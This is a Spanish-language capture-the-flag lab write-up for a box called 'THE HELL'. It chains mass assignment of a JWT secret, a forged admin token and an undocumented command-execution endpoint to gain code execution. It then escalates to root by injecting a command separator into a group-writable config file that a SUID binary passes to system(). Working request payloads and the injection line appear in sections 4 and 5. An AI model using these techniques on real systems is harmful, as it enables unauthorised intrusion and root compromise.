# THE HELL — Bitácora del análisis

**Objetivo:** `172.17.0.2:3000` (contenedor Docker) — **Atacante:** Kali (`172.17.0.1`)
**Dificultad:** difícil (★★★★★☆☆☆, 5 pts) — **Categoría:** Web Exploit (escalada SUID)
**Hostname del objetivo:** `the-hell`
**Bandera:** `thehell{n3stjs_m4ss_4ss1gnm3nt_jwt_bypl4ss}` (validada por el laboratorio)
**Fecha:** 16/10/2026 — validación: 16/10/2026 18:08:46 (tiempo total 1h 30m 20s)

> **Restricción del ejercicio:** el análisis se hizo exclusivamente por red. No se inspeccionó la
> configuración del contenedor ni se leyó su filesystem.

---

## 1. Reconocimiento

### 1.1 Superficie

Un solo puerto abierto en los 65 535: `3000/tcp`, Node.js/Express con la app en `/app/`.

Rutas reales:

| Ruta | Descripción |
|---|---|
| `/`, `/index.html` | Web estática de la peluquería (9040 B) |
| `/integradores.html` | Documentación de la API (2120 B) |
| `/styles.css` | Estilos |
| `GET /v1/public/info` | Información pública del local |
| `POST /v1/onboarding/config` | Alta de configuración (único endpoint dinámico) |

El formulario de reservas es un **señuelo**: el JS inline solo muestra un toast y hace `reset()`.

### 1.2 Fuzzing

220 545 palabras × 4 extensiones (`html`, `js`, `json`, `txt`) → **cero rutas nuevas**.

> Esta cifra explica el problema por sí sola: el endpoint de la fase 4 (`/v1/admin/run-job`) **no está
> en ninguna wordlist**, ni en DirBuster ni en SecLists. No era encontrable por fuerza bruta.

---

## 2. Vías descartadas antes de la pista

| Vía | Resultado |
|---|---|
| FTP/SSH expuestos | No existen |
| SQLi, SSTI, LFI, path traversal (10 variantes), command injection, NoSQL | Nada |
| Prototype pollution (`__proto__`, `constructor.prototype`, notación de punto) | Sin efecto medible |
| XXE (4 Content-Type con DTD y entidad externa) | `Cuerpo de configuración inválido` — solo JSON |
| Virtual hosts, cabeceras de auth, WebSocket, method override | Nada |
| Upload multipart, PUT/PATCH/DELETE, rate limiting | Nada |

Un JSON malformado sí filtra stack trace (`body-parser`), lo que confirma el stack pero no abre vector.

---

## 3. El fallo de método que costó la fase de entrada

Escribí `exploits/map_fields.py` para mapear qué claves del body tienen efecto, comparando la
respuesta de `GET /v1/public/info` con la línea base. Resultado: **solo `app_name` y `city` cambiaban
algo**.

Concluí que el endpoint ignoraba el resto de campos. **Era un falso negativo.** `/v1/public/info` es
una vista *pública*: no expone la configuración interna aunque se haya escrito. El mass
assignment funcionaba; no se reflejaba en ese criterio de verificación.

> **Regla generalizable:** antes de concluir «el campo no se procesa», hay que comprobar si existe un
> punto de lectura *adecuado*. Comparar un endpoint público con uno privado no demuestra nada sobre la
> configuración interna.

---

## 4. La pista y el encadenamiento

La pista indicó: mass assignment para inyectar el secreto JWT, forjar un token administrativo, y
descubrir un endpoint no documentado.

### 4.1 Inyección del secreto

```bash
POST /v1/onboarding/config
{"app_name":"Salon Estilo Lua","city":"Villa Norte","jwt_secret":"s3cr3t_inyectado_chifay"}
-> {"status":"success", ...}
```

El campo que engancha es exactamente `jwt_secret`. La prueba de que agarró:

```
secreto falso  -> 403 {"error":"Invalid signature or expired token"}
secreto real   -> 400 {"error":"Missing command parameter"}
```

### 4.2 Endpoint no documentado

```
GET  /v1/admin/run-job -> 404
POST /v1/admin/run-job -> 401 {"error":"Unauthorized"}
POST {"command":"id"}  -> 200 {"stdout":"uid=1000(node) ...","stderr":"","error":null}
```

**El parámetro es `command`, no `cmd`** — un detalle que solo aparece probando.

### 4.3 El fallo de método que costó encontrar la ruta

`find_admin.py` probó 19 prefijos × 36 verbos = 684 rutas × 2 métodos, con `Authorization: Bearer`,
y **cero** reacciones distintas de 404.

El fallo fue usar solo verbos **atómicos** (`/run`, `/exec`, `/cmd`, `/shell`, `/backup`). El endpoint
real es un verbo **compuesto con sustantivo**: `run-job`. Nunca se probó esa forma.

> **Lección transferible a cualquier fuzzing de API:** generar el diccionario como
> *verbo + sustantivo* (`run-job`, `import-csv`, `export-data`, `reset-password`, `get-report`),
> no solo el verbo. Los nombres reales de endpoint casi nunca son verbos desnudos.

Los diccionarios quedan en `wordlists/` y la corrección está implementada y verificada:
`exploits/find_admin_composed.py` **encuentra `/v1/admin/run-job` por sí solo** (2 014 rutas,
`POST 403`). Ese `403` frente al `404` del `GET` es la señal de que la ruta existe con token falso.

---

## 5. RCE y escalada

```
uid=1000(node) gid=1000(node) groups=1000(node)
```

`/etc/passwd` muestra un único usuario de servicio con `/bin/bash`, y **`sudo` no está instalado**,
lo que descarta esa vía y apunta al inventario SUID:

```
-rwsr-xr-x 1 root root 17024 /usr/local/bin/sysaudit
```

### 5.1 Análisis del SUID

El objetivo **no tiene `file` ni `strings`**. El bit SUID se ve en el propio `ls -l` (`s` en lugar de
`x`), y las cadenas legibles se extraen con `perl`, que sí está instalado:

```
$ python3 exploits/rce.py "perl -ne 'while (/([\x20-\x7e]{4,})/g) { print \"$1\n\" }' \
    /usr/local/bin/sysaudit | grep -E 'config|tail|system'"
  /etc/sysaudit.conf
  Error opening config file
  /usr/bin/tail -n 10 %s
  system   setuid   setgid   fopen   fgets   strcspn
```

Reconstrucción de la lógica: lee una línea de `/etc/sysaudit.conf` y ejecuta
`system("/usr/bin/tail -n 10 " + linea)`. **La ruta se concatena sin comillas.**

### 5.2 El detonante

```
-rw-rw---- 1 root node 26 /etc/sysaudit.conf
```

El grupo `node` puede escribirlo. Se inyecta un separador de comandos:

```bash
printf '%s\n' '/var/log/alternatives.log; id; cat /root/flag.txt' > /etc/sysaudit.conf
/usr/local/bin/sysaudit
```

```
uid=0(root) gid=0(root) groups=0(root),1000(node)
thehell{n3stjs_m4ss_4ss1gnm3nt_jwt_bypl4ss}
```

### 5.3 Validación de la bandera

```
Objetivo: 172.17.0.2
Fecha:    2026-10-16 16:38:26 -0600

Flag (thehell{...}): thehell{n3stjs_m4ss_4ss1gnm3nt_jwt_bypl4ss}

¡Conquistado!
THE HELL completado
Hora:          2026-10-16 18:08:46 -0600
Tiempo Total:  1h 30m 20s
```

---

## 6. Progreso

- [x] Escaneo de puertos completo (un solo servicio)
- [x] Enumeración web y lectura de la documentación de integración
- [x] Fuzzing de 220k rutas sin hallazgos (consistente con que el endpoint admin no está en wordlists)
- [x] Vías de inyección descartadas (SQLi, SSTI, LFI, traversal, command, NoSQL, XXE)
- [x] Mass assignment identificado (`jwt_secret`)
- [x] JWT forjado con claim `{"role":"admin"}`
- [x] Endpoint no documentado localizado: `POST /v1/admin/run-job`
- [x] RCE como `node` (uid 1000)
- [x] `sudo` descartado (no instalado)
- [x] Binario SUID `sysaudit` analizado (cadenas extraídas con `perl`)
- [x] Inyección de comandos en `/etc/sysaudit.conf` → `root`
- [x] Lectura de `/root/flag.txt`
- [x] Bandera validada por el laboratorio (16/10/2026 18:08:46)

```
thehell{n3stjs_m4ss_4ss1gnm3nt_jwt_bypl4ss}
```

---

## 7. Ideas descartadas sobre la marcha

| Hipótesis | Por qué se descartó |
|---|---|
| El endpoint `run-job` está en alguna wordlist | 220k palabras × 4 extensiones no lo encontraron |
| `/v1/public/info` sirve para verificar mass assignment | Es una vista pública; no refleja la config interna |
| El parámetro del endpoint es `cmd` | Devuelve `Missing command parameter`; el correcto es `command` |
| `sudo` para escalar | `sudo: not found` en el objetivo |
| El shell de `node` es `rbash` | `/etc/passwd` declara `/bin/bash`; la restricción (si existe) no está en la shell del usuario |
| Explotar el kernel | Irrelevante: la categoría es Web + SUID |